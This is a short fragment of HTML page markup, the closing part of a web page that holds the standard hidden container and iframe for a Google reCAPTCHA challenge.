</div></div><div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div><div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="recaptcha challenge" src="https://www.google.com/recaptcha/api2/bframe?hl=en&amp;v=v1543818755456&amp;k=6LfbFRsUAAAAACrqF5w4oOiGVxOsjSUjIHHvglJx&amp;cb=7vj7x4tszc3f" name="c-50ubq5sy9oyh" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>